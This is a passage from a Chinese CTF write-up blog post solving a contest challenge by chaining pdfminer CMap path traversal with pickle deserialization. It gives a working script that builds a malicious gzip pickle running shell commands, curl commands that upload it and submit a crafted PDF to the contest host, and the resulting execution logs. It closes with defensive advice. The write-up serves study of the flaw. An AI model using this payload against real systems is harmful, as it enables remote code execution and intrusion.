+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">6 层 -&gt; /usr/data/vault/&lt;VID&gt;/r.pickle.gz      不存在</span><br><span class="line">7 层 -&gt; /data/vault/&lt;VID&gt;/r.pickle.gz          命中</span><br><span class="line">8 层 -&gt; /data/vault/&lt;VID&gt;/r.pickle.gz          也命中（/ 的父目录还是 /）</span><br></pre></td></tr></table></figure>
+
+<p>多于 7 层不会出错（多余的 <code>..</code> 被根吸收），少于 7 层一定落到不存在的中间目录。</p>
+<h4 id="7-构造-r-pickle-gz"><a href="#7-构造-r-pickle-gz" class="headerlink" title="7. 构造 r.pickle.gz"></a>7. 构造 r.pickle.gz</h4><p>服务端是 <code>gzip.open(path)</code> 之后 <code>pickle.loads(...)</code>，所以载荷必须是 <strong>gzip 包着的 pickle</strong>，文件名以 <code>.pickle.gz</code> 结尾：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gzip, io, pickle, pickletools</span><br><span class="line"></span><br><span class="line">CMD = <span class="string">&quot;id; hostname; cat /flag&quot;</span></span><br><span class="line"></span><br><span class="line">CODE = (<span class="string">&quot;(__import__(&#x27;logging&#x27;).getLogger(&#x27;pdfminer.cmapdb&#x27;).error(&#x27;PWN&gt;&#x27;+&quot;</span></span><br><span class="line">        <span class="string">&quot;__import__(&#x27;subprocess&#x27;).run(%r,shell=True,capture_output=True,text=True).stdout&quot;</span></span><br><span class="line">        <span class="string">&quot;.replace(chr(10),&#x27; ;; &#x27;)+&#x27;&lt;PWN&#x27;),&#123;&#125;)[1]&quot;</span>) % (CMD,)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">P</span>:                      <span class="comment"># 恶意构造类，被反序列化时触发</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (CODE,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">raw = pickle.dumps(P(), protocol=<span class="number">2</span>)</span><br><span class="line">buf = io.BytesIO()</span><br><span class="line"><span class="keyword">with</span> gzip.GzipFile(fileobj=buf, mode=<span class="string">&quot;wb&quot;</span>, mtime=<span class="number">0</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(raw)</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;r.pickle.gz&quot;</span>, <span class="string">&quot;wb&quot;</span>).write(buf.getvalue())</span><br><span class="line"></span><br><span class="line">pickletools.dis(raw)</span><br></pre></td></tr></table></figure>
+
+<p>几个细节：</p>
+<ul>
+<li><code>__reduce__</code> 返回 <code>(eval, (CODE,))</code>，<code>pickle.loads</code> 读到 <code>REDUCE</code> 指令就会直接调用 <code>eval</code>；</li>
+<li>结尾用 <code>,&#123;&#125;)[1]</code> 让返回值是个 dict —— 服务端紧接着要执行 <code>type(str(name), (), data)</code>，返回 <code>None</code> 会抛 <code>TypeError</code>（但那时代码已经执行完了）；</li>
+<li>命令输出通过 <code>logging</code> 打到 <code>pdfminer.cmapdb</code> 的 ERROR 日志里，而 app 会把这段日志原样贴进任务页的「引擎诊断」，这就是我们的回显通道（容器里的 8080 打不到）；</li>
+<li>输出里的换行压成 <code>;;</code>，否则 <code>&lt;pre&gt;</code> 会按行切碎。</li>
+</ul>
+<p><code>pickletools.dis</code> 应该能看到这两行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2: c    GLOBAL     &#x27;__builtin__ eval&#x27;</span><br><span class="line">35: R    REDUCE</span><br></pre></td></tr></table></figure>
+
+<h4 id="8-上传、拿-VID、投递"><a href="#8-上传、拿-VID、投递" class="headerlink" title="8. 上传、拿 VID、投递"></a>8. 上传、拿 VID、投递</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$base</span> = <span class="string">&quot;http://hbc2.haobachang.com:22966&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传 payload 到云盘（返回 302 跳回 /vault，响应里没有编号）</span></span><br><span class="line">curl.exe <span class="literal">-s</span> <span class="operator">-F</span> <span class="string">&quot;blob=@r.pickle.gz;type=application/gzip&quot;</span> <span class="string">&quot;<span class="variable">$base</span>/vault&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编号要去 /vault 列表里取</span></span><br><span class="line"><span class="variable">$VID</span> = (([<span class="type">regex</span>]::Matches((curl.exe <span class="literal">-s</span> <span class="string">&quot;<span class="variable">$base</span>/vault&quot;</span>), <span class="string">&#x27;/vault/([0-9a-f]&#123;8&#125;)/r\.pickle\.gz&#x27;</span>) |</span><br><span class="line">         <span class="built_in">ForEach-Object</span> &#123; <span class="variable">$_</span>.Groups[<span class="number">1</span>].Value &#125;) | <span class="built_in">Select-Object</span> <span class="literal">-First</span> <span class="number">1</span>)</span><br><span class="line"><span class="string">&quot;VID = <span class="variable">$VID</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>把 <code>&lt;VID&gt;</code> 填进 <code>/Encoding</code>、重新 <code>qpdf work.qdf chart.pdf</code>，然后投递：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$JID</span> = ([<span class="type">regex</span>]::Match((curl.exe <span class="literal">-s</span> <span class="literal">-i</span> <span class="operator">-F</span> <span class="string">&quot;chart=@chart.pdf;type=application/pdf&quot;</span> <span class="string">&quot;<span class="variable">$base</span>/charts&quot;</span>),</span><br><span class="line">        <span class="string">&#x27;Location: /jobs/([0-9a-f]&#123;8&#125;)&#x27;</span>)).Groups[<span class="number">1</span>].Value</span><br><span class="line">curl.exe <span class="literal">-s</span> <span class="string">&quot;<span class="variable">$base</span>/jobs/<span class="variable">$JID</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="9-读引擎诊断"><a href="#9-读引擎诊断" class="headerlink" title="9. 读引擎诊断"></a>9. 读引擎诊断</h4><p>任务页的「引擎诊断」里，命中时的日志长这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">job.start file=/data/vault/xxxxxxxx/chart.pdf</span><br><span class="line">engine=pdfminer.six 20250506</span><br><span class="line">cmap.search CMAP_PATH=/usr/share/pdfminer/</span><br><span class="line">cmap.search package=/usr/local/lib/python3.12/site-packages/pdfminer/cmap</span><br><span class="line">pdfminer.cmapdb DEBUG loading: &#x27;../../../../../../../data/vault/&lt;VID&gt;/r&#x27;</span><br><span class="line">pdfminer.cmapdb ERROR PWN&gt;uid=10001(app) gid=10001(app) ...</span><br></pre></td></tr></table></figure>
+
+<p><code>loading:</code> 那行打印的是 <code>_load_data()</code> 收到的字符串，<strong>调试时看它最快</strong>：路径对不对、层数够不够，一眼就能看出来。</p>
+<h3 id="排错对照表"><a href="#排错对照表" class="headerlink" title="排错对照表"></a>排错对照表</h3><p>| 诊断内容 | 说明 | 改哪里 |
+| — | — | — |
+| 只有 <code>job.start</code> + <code>cmap.search</code> | 字体没被实例化 | 内容流里要有 <code>BT /F1 12 Tf</code>，且改的是 <code>/F1</code> 对应的对象 |
+| <code>KeyError: &#39;DescendantFonts&#39;</code> | Type0 字典结构坏了 | 删掉裸 <code>/WinAnsiEncoding</code>，检查 <code>#2f</code> 是否完整 |
+| 有 <code>FontBBox</code> WARNING、<strong>没有</strong> <code>loading:</code> | <code>DescendantFonts</code> 指向 <code>null</code> | 补 <code>11 0 obj</code>，让引用有落点 |
+| <code>loading:</code> + <code>decode: &lt;CMap: None&gt;</code> | 路径没命中文件 | 层数（7）、<code>#2f</code> 数量、文件名是否 <code>r.pickle.gz</code>、VID 是否本次上传 |
+| <code>loading:</code> + <code>PWN&gt;</code> | 通了 | 收工 |</p>
+<h3 id="一句话总结"><a href="#一句话总结" class="headerlink" title="一句话总结"></a>一句话总结</h3><p>PDF 只是入口，真正的问题是三段拼接：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">path = os.path.join(fixed_dir, name_from_pdf + <span class="string">&quot;.pickle.gz&quot;</span>)   <span class="comment"># ① 用户可控字符串进路径</span></span><br><span class="line">pickle.loads(gzip.<span class="built_in">open</span>(path).read())                            <span class="comment"># ② 文件内容当代码执行</span></span><br></pre></td></tr></table></figure>
+
+<p>防御也就两条：<strong>名字白名单 + realpath 校验</strong>（别让 PDF 决定路径），以及<strong>别用 pickle 当缓存格式</strong>（CMap 换 JSON &#x2F; 明文 CMap 即可）。云盘再把 <code>.pickle*</code> 这类后缀放开，等于白送一个 payload 托管服务。</p>
+
+                <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+                <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                    <source type="audio/mpeg" src="">
+                </audio>
+                
+                <ul id="audio-list" style="display:none">
+                    
+                    
+                    <li title="0" data-url="https://blog.curesky.site/audio/yinlang.mp3"></li>
+                    
+                    
+                </ul>
+                
+            </div>
+
+            
+<section class="f-copyright">
+    <div class="f-copy-main">
+        <p class="f-copy-title">本文作者 <b>Allureluoli</b></p>
+        <p class="f-copy-text">文字版权归作者所有，转载请注明出处；商业用途请先联系二月。</p>
+    </div>
+    <div class="f-copy-side">
+        <span>CC BY-NC-ND 4.0</span>
+        <a href="/2026/10/28/2026-10-28-%E5%8D%8E%E4%B8%AD%E5%B8%88%E8%8C%83%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0WP/" target="_blank" rel="noopener">原文链接 ↗</a>
+    </div>
+</section>
+
+
+<nav class="f-pn" aria-label="上一篇 / 下一篇">
+    
+    <a class="f-pn-card f-pn-prev" href="/2026/10/21/2026-10-21-php2shell/">
+        <span class="f-pn-label">← 更新的文章</span>
+        <span class="f-pn-title">2026-10-21-php2shell</span>
+        <span class="f-pn-date">2026-10-21</span>
+    </a>
+    
+    
+</nav>
+
+
+<div class="f-comments">
+    <p class="f-comments-title">评论<em>COMMENTS</em></p>
+    
+<div id="gitalk-container" class="comment link"
+    data-enable="true"
+    data-ae="true"
+    data-ci="10a7f71656553fd4676c"
+    data-cs="48f8d183288b4d0b2531f047719dee43bdc913ec"
+    data-r="allureluoli.github.io"
+    data-o="allureluoli"
+    data-a="allureluoli"
+    data-d="false"
+>查看评论 · 基于 GitHub Issues</div>
+
+
+</div>
+
+        </article>
+
+        <aside class="f-post-aside">
+            
+            <div class="f-toc-card" id="f-toc-card">
+                <p class="f-toc-title">目录<em>CONTENTS</em></p>
+                <div class="f-toc-body"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%8E%E4%B8%AD%E5%B8%88%E8%8C%83%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0WP"><span class="toc-text">华中师范新生赛复现WP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E9%87%8D%E6%96%B0%E5%BC%80%E5%A7%8B%E5%90%97-%E2%80%94%E2%80%94-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88IDOR%EF%BC%89"><span class="toc-text">一、我们可以重新开始吗 —— 越权访问（IDOR）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%85%A8%E5%BF%83%E5%80%BE%E8%A6%86%EF%BC%8C%E5%88%86%E5%B4%A9%E7%A6%BB%E6%9E%90-%E2%80%94%E2%80%94-pdfminer-CMap-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A-pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">二、全心倾覆，分崩离析 —— pdfminer CMap 路径穿越 + pickle 反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E6%AD%A5%E9%AA%A4"><span class="toc-text">完整步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-PDF-%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%AF%B9%E8%B1%A1%E7%BB%93%E6%9E%84"><span class="toc-text">1. PDF 的基本对象结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9C%AC%E5%9C%B0%E5%85%88%E7%94%9F%E6%88%90%E4%B8%80%E4%B8%AA%E6%9E%81%E5%B0%8F%E7%9A%84-PDF"><span class="toc-text">2. 本地先生成一个极小的 PDF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E7%94%A8-qpdf-%E8%A7%A3%E5%8C%85%E6%88%90%E5%8F%AF%E7%BC%96%E8%BE%91%E7%9A%84-QDF"><span class="toc-text">3. 用 qpdf 解包成可编辑的 QDF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%94%B9%E5%AD%97%E4%BD%93%E5%AD%97%E5%85%B8"><span class="toc-text">4. 改字体字典</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%BF%85%E9%A1%BB%E8%A1%A5%E4%B8%80%E4%B8%AA-11-0-obj"><span class="toc-text">5. 必须补一个 11 0 obj</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E4%B8%BA%E4%BB%80%E4%B9%88%E6%98%AF-7-%E5%B1%82"><span class="toc-text">6. 为什么是 7 层 ..&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E6%9E%84%E9%80%A0-r-pickle-gz"><span class="toc-text">7. 构造 r.pickle.gz</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-%E4%B8%8A%E4%BC%A0%E3%80%81%E6%8B%BF-VID%E3%80%81%E6%8A%95%E9%80%92"><span class="toc-text">8. 上传、拿 VID、投递</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-%E8%AF%BB%E5%BC%95%E6%93%8E%E8%AF%8A%E6%96%AD"><span class="toc-text">9. 读引擎诊断</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%92%E9%94%99%E5%AF%B9%E7%85%A7%E8%A1%A8"><span class="toc-text">排错对照表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%80%BB%E7%BB%93"><span class="toc-text">一句话总结</span></a></li></ol></div>
+            </div>
+            
+        </aside>
+    </div>
+</div>
+
+
+    
+<footer class="f-footer">
+    <span class="f-footer-glow" aria-hidden="true"></span>
+    <div class="f-footer-inner">
+        <a class="f-footer-brand" href="/">
+            <img class="f-footer-avatar" src="/img/avatar.jpg" alt="Allureluoli" width="34" height="34">
+            <span>二月の档案室<em>FEBRUARY · ARCHIVE</em></span>
+        </a>
+
+        <p class="f-footer-quote">
+            <span class="f-footer-quote-zh">我不相信命运，且我将在醉生梦死中追寻真正的自我。</span>
+            <span class="f-footer-quote-en">I do not believe in fate. In wine and dreams, I will seek out my true self.</span>
+        </p>
+
+        <div class="f-footer-links">
+            
+            <a href="https://x.com/DevilC1875" target="_blank" rel="noopener">X</a>
+            
+            <a href="https://github.com/allureluoli/" target="_blank" rel="noopener">GitHub</a>
+            
+            <a href="weixin://dl/chat?moonfebruarymoon" target="_blank" rel="noopener">微信</a>
+            
+            <a href="mailto:3345483363@qq.com" target="_blank" rel="noopener">Email</a>
+            
+            <a href="/atom.xml">RSS</a>
+        </div>
+
+        <p class="f-footer-meta">
+            &copy; 2026 Allureluoli · Powered by Hexo · Theme Diaspora · 魔改 by 二月
+        </p>
+
+        
+        <p class="f-footer-beian">
+            <a rel="nofollow" href="https://www.baidu.com/s?wd=为什么有的网站没有备案" target="_blank">为什么呢</a>
+        </p>
+        
+    </div>
+</footer>
+
+
+    <button class="f-totop" id="f-totop" type="button" aria-label="回到顶部">
+        <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 19V5M5 12l7-7 7 7" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    </button>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+<script src="/js/february.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
